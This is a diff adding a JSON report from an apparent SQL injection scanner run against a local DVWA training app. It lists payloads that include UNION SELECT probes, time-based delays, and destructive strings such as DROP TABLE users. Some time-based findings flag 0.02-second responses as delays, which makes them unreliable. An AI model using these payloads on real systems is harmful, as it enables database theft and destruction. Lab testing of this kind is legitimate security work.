@@ -1,0 +1,351 @@
+{
+  "scan_metadata": {
+    "timestamp": "2026-04-07T13:41:33.067126",
+    "total_urls_scanned": 1,
+    "total_vulnerabilities_found": 21,
+    "payloads_used": 28
+  },
+  "vulnerabilities": [
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "Submit",
+      "payload": "'; WAITFOR DELAY '0:0:3'--",
+      "http_status": 200,
+      "response_time_s": 0.021,
+      "findings": [
+        {
+          "type": "time_based_blind",
+          "detail": "Response delayed 0.02s with time-based payload"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "'",
+      "http_status": 200,
+      "response_time_s": 0.057,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 162"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "' OR '1'='1",
+      "http_status": 200,
+      "response_time_s": 0.026,
+      "findings": [
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 4934"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "' OR '1'='1' --",
+      "http_status": 200,
+      "response_time_s": 0.037,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 160"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "' OR '1'='1' /*",
+      "http_status": 200,
+      "response_time_s": 0.03,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 162"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "' OR 1=1 --",
+      "http_status": 200,
+      "response_time_s": 0.021,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 160"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "' OR 1=1#",
+      "http_status": 200,
+      "response_time_s": 0.031,
+      "findings": [
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 4924"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "admin'--",
+      "http_status": 200,
+      "response_time_s": 0.02,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 160"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "' OR 'x'='x",
+      "http_status": 200,
+      "response_time_s": 0.034,
+      "findings": [
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 4934"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "1' OR '1'='1",
+      "http_status": 200,
+      "response_time_s": 0.03,
+      "findings": [
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 4939"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "' AND 1=1 --",
+      "http_status": 200,
+      "response_time_s": 0.058,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 160"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "' AND 1=2 --",
+      "http_status": 200,
+      "response_time_s": 0.032,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 160"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "'; WAITFOR DELAY '0:0:3'--",
+      "http_status": 200,
+      "response_time_s": 0.061,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 183"
+        },
+        {
+          "type": "time_based_blind",
+          "detail": "Response delayed 0.06s with time-based payload"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "'; SELECT SLEEP(3)--",
+      "http_status": 200,
+      "response_time_s": 0.022,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 177"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "' UNION SELECT NULL--",
+      "http_status": 200,
+      "response_time_s": 0.026,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 160"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "http_status": 200,
+      "response_time_s": 0.022,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 160"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "' UNION SELECT NULL,NULL,NULL--",
+      "http_status": 200,
+      "response_time_s": 0.042,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 160"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "'; DROP TABLE users--",
+      "http_status": 200,
+      "response_time_s": 0.018,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 178"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "'; INSERT INTO users VALUES(1)--",
+      "http_status": 200,
+      "response_time_s": 0.022,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 189"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "'--",
+      "http_status": 200,
+      "response_time_s": 0.021,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 160"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
+      "parameter": "id",
+      "payload": "'/*",
+      "http_status": 200,
+      "response_time_s": 0.031,
+      "findings": [
+        {
+          "type": "error_based",
+          "detail": "DB error pattern matched: you have an error in your sql syntax"
+        },
+        {
+          "type": "length_anomaly",
+          "detail": "Response length changed: 4651 \u2192 162"
+        }
+      ]
+    }
+  ]
+}
